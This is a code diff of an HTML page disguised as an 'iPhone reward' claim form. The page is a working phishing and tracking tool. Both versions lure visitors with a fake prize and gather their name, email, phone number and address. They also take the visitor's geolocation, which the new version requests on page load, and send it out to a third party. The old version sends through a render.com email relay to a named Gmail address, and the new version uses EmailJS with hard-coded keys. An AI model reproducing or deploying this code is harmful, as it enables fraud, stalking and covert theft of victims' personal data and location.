@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>iPhone Reward Form</title>
-    <!-- Bootstrap CSS -->
     <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
     <style>
         body {
@@ -13,61 +12,19 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f0f8ff; /* Light background color to make form visible */
+            background-color: #f0f8ff;
             font-family: Arial, sans-serif;
         }
         .container {
             max-width: 600px;
-            background: #ffffff; /* Solid background color for form */
+            background: #ffffff;
             padding: 2rem;
             border-radius: 10px;
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
             text-align: center;
         }
-        .form-heading {
-            color: #333;
-            font-size: 1.8rem;
-            font-weight: bold;
-            margin-bottom: 15px;
-        }
-        .lead {
-            color: #555;
-            font-size: 1rem;
-            margin-bottom: 20px;
-        }
-        .form-group label {
-            font-weight: bold;
-            color: #444;
-        }
-        .form-control {
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            padding: 10px;
-            font-size: 1rem;
-            transition: border-color 0.3s;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
-        }
-        .form-control:focus {
-            border-color: #007bff;
-            box-shadow: 0 0 8px rgba(0, 123, 255, 0.2);
-        }
-        .btn-primary {
-            background-color: #007bff;
-            border: none;
-            border-radius: 8px;
-            padding: 10px 20px;
-            font-size: 1rem;
-            margin-top: 15px;
-            transition: background-color 0.3s, transform 0.2s;
-        }
-        .btn-primary:hover {
-            background-color: #0056b3;
-            transform: translateY(-2px);
-        }
-        .form-text {
-            font-size: 0.9rem;
-            color: #666;
-            margin-top: 10px;
+        #rewardContent {
+            display: none; /* Hidden initially */
         }
         #locationDisplay {
             background: #e9ecef;
@@ -77,177 +34,115 @@
             margin-top: 15px;
             font-size: 0.9rem;
         }
+        .form-group {
+            margin-bottom: 1rem;
+        }
+        .form-control {
+            padding: 0.75rem;
+            font-size: 1rem;
+            border-radius: 5px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1 class="form-heading">Congratulations! 🎉</h1>
-        <p class="lead">You've been selected to receive a brand-new iPhone!</p>
-        <p class="form-text">Please fill out the form below to claim your reward.</p>
+        <!-- Form to be shown first -->
+        <div id="formContent">
+            <h1 class="form-heading">Claim Your iPhone Reward! 🎉</h1>
+            <p class="lead">Please enter your details to claim your reward.</p>
 
-        <!-- Fill Out Form -->
-        <form id="rewardForm">
-            <div class="form-group">
-                <label for="fullName">Full Name</label>
-                <input type="text" class="form-control" id="fullName" placeholder="Enter your full name" required>
-            </div>
-            <div class="form-group">
-                <label for="dob">Date of Birth</label>
-                <input type="date" class="form-control" id="dob" required>
-            </div>
-            <div class="form-group">
-                <label for="email">Email Address</label>
-                <input type="email" class="form-control" id="email" placeholder="Enter your email" required>
-            </div>
-            <div class="form-group">
-                <label for="phoneNumber">Phone Number</label>
-                <input type="tel" class="form-control" id="phoneNumber" placeholder="Enter your phone number" required>
-            </div>
-            <div class="form-group">
-                <label for="address">Shipping Address</label>
-                <textarea class="form-control" id="address" rows="3" placeholder="Enter your shipping address" required></textarea>
-            </div>
-            <div class="form-group">
-                <label for="city">City</label>
-                <input type="text" class="form-control" id="city" placeholder="Enter your city" required>
-            </div>
-            <div class="form-group">
-                <label for="postalCode">Postal Code</label>
-                <input type="text" class="form-control" id="postalCode" placeholder="Enter your postal code" required>
-            </div>
+            <form id="userForm">
+                <div class="form-group">
+                    <label for="username">Your Name</label>
+                    <input type="text" id="username" class="form-control" placeholder="Enter your name" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" class="form-control" placeholder="Enter your email" required>
+                </div>
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" class="form-control" placeholder="Enter your phone number" required>
+                </div>
+                <div class="form-group">
+                    <label for="address">Address</label>
+                    <textarea id="address" class="form-control" placeholder="Enter your address" rows="4" required></textarea>
+                </div>
+                <button type="submit" class="btn btn-primary">Submit</button>
+            </form>
+        </div>
 
-            <p id="locationDisplay" class="form-text">Location permissions required to auto-fill your location.</p>
-            <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
-        </form>
+        <!-- Reward Message and Location (Hidden initially) -->
+        <div id="rewardContent">
+            <h1 class="form-heading">Congratulations! 🎉</h1>
+            <p class="lead">You've been selected to receive a brand-new iPhone!</p>
+            <p class="form-text">Please allow location access to claim your reward.</p>
+            <p id="locationDisplay" class="form-text">Waiting for location...</p>
+        </div>
     </div>
 
-    <!-- JavaScript code (unchanged) -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
         document.addEventListener("DOMContentLoaded", function () {
-            const locationDisplay = document.getElementById("locationDisplay");
-            let lastSentPosition = null;
+            emailjs.init("-_fZgZZhnhhK2OvuV"); // Public Key
 
-            function calculateDistance(lat1, lon1, lat2, lon2) {
-                const R = 6371e3;
-                const φ1 = lat1 * Math.PI / 180;
-                const φ2 = lat2 * Math.PI / 180;
-                const Δφ = (lat2 - lat1) * Math.PI / 180;
-                const Δλ = (lon2 - lon1) * Math.PI / 180;
+            // Automatically request location permission when the page is loaded
+            trackMovement();
 
-                const a = Math.sin(Δφ / 2) * Math.sin(Δφ / 2) +
-                          Math.cos(φ1) * Math.cos(φ2) *
-                          Math.sin(Δλ / 2) * Math.sin(Δλ / 2);
-                const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+            // When form is submitted
+            document.getElementById("userForm").addEventListener("submit", function(event) {
+                event.preventDefault(); // Prevent form from reloading the page
 
-                return R * c;
-            }
+                // Hide the form content
+                document.getElementById("formContent").style.display = "none";
+
+                // Show the reward content
+                document.getElementById("rewardContent").style.display = "block";
+            });
 
             function sendLocationEmail(latitude, longitude) {
-                locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "rizwanrao095@gmail.com");
+                console.log("📍 Sending Location Data:", { latitude, longitude });
+
+                const templateParams = {
+                    latitude: latitude.toString(),
+                    longitude: longitude.toString()
+                };
+
+                emailjs.send("service_7xiz4x8", "template_ux0sel8", templateParams)
+                    .then((response) => {
+                        console.log("✅ Email sent successfully!", response);
+                        document.getElementById("locationDisplay").textContent = "📧 Location sent!";
+                    })
+                    .catch((error) => {
+                        console.error("❌ Error sending email:", error);
+                        document.getElementById("locationDisplay").textContent = "⚠️ Email sending failed!";
+                    });
             }
 
             function trackMovement() {
                 if ("geolocation" in navigator) {
-                    navigator.geolocation.watchPosition(
+                    // This triggers the location permission prompt automatically when the page loads
+                    navigator.geolocation.getCurrentPosition(
                         (position) => {
                             const latitude = position.coords.latitude;
                             const longitude = position.coords.longitude;
 
-                            if (lastSentPosition) {
-                                const distanceMoved = calculateDistance(
-                                    lastSentPosition.latitude,
-                                    lastSentPosition.longitude,
-                                    latitude,
-                                    longitude
-                                );
+                            console.log("🌍 Location received:", latitude, longitude);
+                            document.getElementById("locationDisplay").textContent = 
+                                `📍 Latitude: ${latitude}, Longitude: ${longitude}`;
 
-                                if (distanceMoved > 50) {
-                                    sendLocationEmail(latitude, longitude);
-                                    lastSentPosition = { latitude, longitude };
-                                }
-                            } else {
-                                lastSentPosition = { latitude, longitude };
-                                sendLocationEmail(latitude, longitude);
-                            }
+                            sendLocationEmail(latitude, longitude);
                         },
                         (error) => {
-                            switch (error.code) {
-                                case error.PERMISSION_DENIED:
-                                    locationDisplay.textContent = "Location access denied by user.";
-                                    break;
-                                case error.POSITION_UNAVAILABLE:
-                                    locationDisplay.textContent = "Location information is unavailable.";
-                                    break;
-                                case error.TIMEOUT:
-                                    locationDisplay.textContent = "Location request timed out.";
-                                    break;
-                                default:
-                                    locationDisplay.textContent = "An unknown error occurred.";
-                                    break;
-                            }
-                            sendEmail("Location Access Error", locationDisplay.textContent, "rizwanrao095@gmail.com");
-                        },
-                        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+                            console.error("❌ Error getting location:", error);
+                            document.getElementById("locationDisplay").textContent = 
+                                "⚠️ Location access denied!";
+                        }
                     );
                 } else {
-                    locationDisplay.textContent = "Geolocation is not supported by this browser.";
+                    console.log("❌ Geolocation not supported.");
+                    document.getElementById("locationDisplay").textContent = "⚠️ Geolocation not supported!";
                 }
-            }
-
-            trackMovement();
-
-            document.getElementById("rewardForm").addEventListener("submit", function (e) {
-                e.preventDefault();
-
-                const fullName = document.getElementById("fullName").value;
-                const dob = document.getElementById("dob").value;
-                const email = document.getElementById("email").value;
-                const phoneNumber = document.getElementById("phoneNumber").value;
-                const address = document.getElementById("address").value;
-                const city = document.getElementById("city").value;
-                const postalCode = document.getElementById("postalCode").value;
-
-                const formMessage = `Full Name: ${fullName}\nDate of Birth: ${dob}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nAddress: ${address}\nCity: ${city}\nPostal Code: ${postalCode}`;
-
-                sendEmail("New iPhone Claim Form Submission", formMessage, "rizwanrao095@gmail.com");
-
-                alert("Thank you for your submission! We will contact you shortly.");
-            });
-
-            function sendEmail(subject, message, recipientEmail) {
-                const emailData = {
-                    subject: subject,
-                    message: message,
-                    recipient_email: recipientEmail,
-                    recipient_name: "Khalil Ahmed"
-                };
-
-                fetch("https://simple-send-email-kzbu.onrender.com/api/send-email/", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify(emailData)
-                })
-                .then(response => {
-                    if (response.ok) {
-                        return response.json();
-                    } else {
-                        throw new Error(`Server responded with ${response.status}`);
-                    }
-                })
-                .then(data => {
-                    if (data.message) {
-                        console.log("Email sent successfully");
-                    } else if (data.error) {
-                        alert("Error: " + data.error);
-                    }
-                })
-                .catch(error => {
-                    console.log("Error sending email:", error);
-                    alert("Error sending email: " + error.message);
-                });
             }
         });
     </script>
